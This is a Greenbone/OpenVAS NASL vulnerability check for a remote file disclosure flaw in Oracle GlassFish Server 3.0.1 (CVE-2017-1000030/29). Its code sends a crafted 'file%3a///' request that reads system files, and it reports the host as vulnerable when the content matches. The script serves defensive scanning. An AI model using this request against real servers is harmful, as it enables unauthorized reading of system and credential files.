CPE = "cpe:/a:oracle:glassfish_server";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.808231" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2017-1000030", "CVE-2017-1000029" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-06-21 11:16:21 +0530 (Tue, 21 Jun 2016)" );
	script_name( "Oracle GlassFish Server Multiple Remote File Disclosure Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Oracle GlassFish
  Server and is prone to multiple remote file disclosure vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not." );
	script_tag( name: "insight", value: "Multiple flaws exist due to:

  - An insufficient validation of user supplied input via 'file' GET parameter
    in the file system API in Oracle GlassFish Server.

  - An unauthenticated access is possible to 'JVM Report page' which will disclose
    Java Key Store password of The Admin Console." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to read arbitrary files on the server, to obtain administrative
  privileged access to the web interface of the affected device and to launch
  further attacks on the affected system." );
	script_tag( name: "affected", value: "GlassFish Server Open Source Edition
  version 3.0.1 (build 22)" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2016-011/?fid=8037" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "GlassFish_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "GlassFish/installed" );
	script_require_ports( "Services/www", 4848 );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = "/resource/file%3a///" + files[file];
	if(http_vuln_check( port: http_port, url: url, pattern: file, check_header: TRUE )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( port: http_port, data: report );
		exit( 0 );
	}
}
exit( 99 );

